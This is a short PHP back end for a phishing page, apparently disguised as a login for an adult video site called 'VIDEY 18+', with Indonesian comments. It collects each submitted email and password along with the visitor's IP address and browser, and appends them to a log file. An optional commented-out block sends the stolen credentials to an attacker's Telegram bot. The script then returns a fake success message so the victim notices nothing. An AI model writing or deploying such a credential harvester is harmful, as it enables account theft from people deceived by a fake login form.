<?php
// Ambil data dari form
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Format data yang akan disimpan
$data = "==========\n";
$data .= "WAKTU : " . date('Y-m-d H:i:s') . "\n";
$data .= "IP    : $ip\n";
$data .= "UA    : $userAgent\n";
$data .= "EMAIL : $email\n";
$data .= "PASS  : $password\n";
$data .= "==========\n\n";

// Simpan ke file log.txt (otomatis kebuat)
file_put_contents("log.txt", $data, FILE_APPEND);

// 🔥 OPSIONAL: Kirim ke Telegram (isi token dan chat_id lo)
/*
$token = "7212345678:AAHdqTcvkLalala_YourBotToken";
$chat_id = "1234567890";
$message = urlencode("📧 VIDEY 18+ LOGIN\nIP: $ip\nEmail: $email\nPassword: $password");
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message");
*/

// Balikin response ke frontend biar gak error
echo json_encode(["status" => "ok", "message" => "Login diterima"]);
?>
